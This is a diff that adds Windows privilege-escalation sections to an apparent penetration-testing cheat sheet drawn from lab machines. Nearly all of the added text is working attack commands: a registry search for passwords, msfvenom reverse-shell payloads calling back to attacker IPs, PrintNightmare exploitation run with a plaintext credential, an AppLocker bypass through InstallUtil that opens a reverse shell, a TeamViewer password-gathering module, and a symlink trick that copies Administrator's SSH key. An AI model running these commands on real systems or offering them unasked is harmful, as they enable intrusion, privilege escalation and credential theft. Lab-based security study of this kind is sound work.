@@ -194,6 +194,11 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Pass The Hash](#pass-the-hash-1)
     - [Apache lateral movement](#apache-lateral-movement)
     - [Read data stream](#read-data-stream)
+    - [PrintNightmare](#printnightmare)
+    - [Bypass CLM / CLM breakout | CLM / AppLocker Break Out](#bypass-clm--clm-breakout--clm--applocker-break-out)
+    - [From Local Admin to System](#from-local-admin-to-system)
+    - [TeamViewer](#teamviewer)
+    - [Exploiting service through Symbolic Links](#exploiting-service-through-symbolic-links)
   - [Buffer Overflow](#buffer-overflow)
   - [Antivirus Evasion](#antivirus-evasion)
     - [ToDo](#todo)
@@ -3560,6 +3565,10 @@ Get-History
 (Get-PSReadlineOption).HistorySavePath
 type C:\Users\Public\Transcripts\transcript01.txt
 
+<# find secrets #>
+reg query HKLM /f password /t REG_SZ /s
+Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt
+
 ```
 
 To use Event Viewer to search for events recorded by Script Block Logging:
@@ -4765,6 +4774,23 @@ net start/stop <name>                            Start/Stop a service
 5. Set a listener and start the service `net start <service>`
 
 **Unquoted Service Path**
+
+- `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
+  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
+    1. Check which user is running it: `sc qc SERVICE_NAME`
+    2. check it with a command similar to the following to see if you have write priv: `powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`
+- If you have found an Unquoted Service Path:
+  - `Get-Acl -Path "C:\Program Files (x86)\service" | Format-List`
+    - see if you have write privileges (with `icacls`)
+  - `"service" | Get-ServiceACL | select -ExpandProperty Access`
+    - see if you can stop and start (restart) the service
+  - `msfvenom -p windows/shell_reverse_tcp LHOST=10.18.110.121 LPORT=445 -f exe -o shell.exe`
+  - copy the `shell.exe`, then:
+    1. `sc start "service"`
+    2. `Stop-Service -name "service"`
+    3. `Start-Service -name "service"`
+
+Another way
 1. Check: ["Microsoft Windows Unquoted Service Path Vulnerability"](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)
 2. Query a service. If it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`) and the `BINARY_PATH_NAME` value is unquoted and contains spaces, it's possible a privilege escalation
    - `sc qc <service>`
@@ -5014,6 +5040,46 @@ maybe you are in a directory where there is something strange
 2. Use the following command
    `powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
 - See Hack The Box - Jeeves
+
+
+#### <ins>PrintNightmare</ins>
+- `impacket-rpcdump @10.10.108.190 | egrep 'MS-RPRN|MS-PAR'`. See: https://github.com/cube0x0/CVE-2021-1675#scanning
+    1. `msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=10.18.110.121 LPORT=447 -f dll > shell.dll`
+    2. `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
+    4. Set a listener: `msfconsole -q`, `use multi/handler`
+    3. `python3 '/home/kali/Documents/windows-attack/CVE/PrintNightmare/CVE-2021-1675/CVE-2021-1675.py' VULNNET/enterprise-security:'sand_0873959498'@10.10.198.52 '\\10.18.110.121\share\shell.dll'`
+  - For just a Priv Esc, use https://github.com/calebstewart/CVE-2021-1675
+- See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare
+
+
+#### <ins>Bypass CLM / CLM breakout | CLM / AppLocker Break Out</ins>
+- Verify that you are in a contained enviorment with
+  - `$executioncontext.sessionstate.languagemode`
+  - `Get-AppLockerPolicy -Effective -XML`
+  - see https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+- https://github.com/padovah4ck/PSByPassCLM
+- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+- reverse shell: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe`
+- Msbuild: https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
+           https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+
+
+#### <ins>From Local Admin to System</ins>
+- If you are part of the group "Administrators", try: `.\PsExec.exe -i -s -d -accepteula cmd`
+
+
+#### <ins>TeamViewer</ins>
+- TeamViewer 7 vulnerable to CVE-2019-18988
+  - https://whynotsecurity.com/blog/teamviewer/
+  - use post/windows/gather/credentials/teamviewer_passwords
+
+
+#### <ins>Exploiting service through Symbolic Links</ins>
+A symbolic link is a file object that points to another file object. The object being pointed to is called the target.
+- create a Mount Point: `./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"`
+  - In this way, a script that copies `request.log` will copy `id_rsa` instead
+  - see proving-grounds/Symbolic
+
 
 
 ### <ins>Buffer Overflow</ins>
